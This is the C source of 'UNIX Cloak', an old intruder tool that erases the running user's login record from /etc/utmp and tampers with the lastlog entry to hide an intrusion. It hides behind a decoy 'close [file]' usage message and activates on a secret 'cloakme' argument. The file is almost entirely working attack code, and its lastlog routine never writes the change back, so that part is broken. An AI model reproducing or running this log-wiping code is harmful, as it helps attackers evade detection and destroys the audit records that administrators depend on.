/* UNIX Cloak v1.0 (alpha)  Written by: Wintermute of -Resist- */
/* This file totally wipes all presence of you on a UNIX system*/
/* It works on SCO, BSD, Ultrix, HP/UX, and anything else that */
/* is compatible..  This file is for information purposes ONLY!*/

/*--> Begin source...    */
#include <fcntl.h>
#include <utmp.h>
#include <sys/types.h>
#include <unistd.h>
#include <lastlog.h>

main(argc, argv)
    int     argc;
    char    *argv[];
{
    char    *name;
    struct utmp u;
    struct lastlog l;
    int     fd;
    int     i = 0;
    int     done = 0;
    int     size;

    if (argc != 1) {
         if (argc >= 1 && strcmp(argv[1], "cloakme") == 0) {
	     printf("You are now cloaked\n");
	     goto start;
                                                           }
         else {
	      printf("close successful\n");
	      exit(0);
	      }
		   }
    else {
	 printf("usage: close [file to close]\n");
	 exit(1);
	 }
start:
    name = (char *)(ttyname(0)+5);
    size = sizeof(struct utmp);

    fd = open("/etc/utmp", O_RDWR);
    if (fd < 0)
	perror("/etc/utmp");
    else {
	while ((read(fd, &u, size) == size) && !done) {
	    if (!strcmp(u.ut_line, name)) {
		done = 1;
		memset(&u, 0, size);
		lseek(fd, -1*size, SEEK_CUR);
		write(fd, &u, size);
		close(fd);
	    }
	}
    }


    size = sizeof(struct lastlog);
    fd = open("/var/adm/lastlog", O_RDWR);
    if (fd < 0)
	perror("/var/adm/lastlog");
    else {
	lseek(fd, size*getuid(), SEEK_SET);
	read(fd, &l, size);
	l.ll_time = 0;
	strncpy(l.ll_line, "ttyq2 ", 5);
	gethostname(l.ll_host, 16);
	lseek(fd, size*getuid(), SEEK_SET);
	close(fd);
    }
}

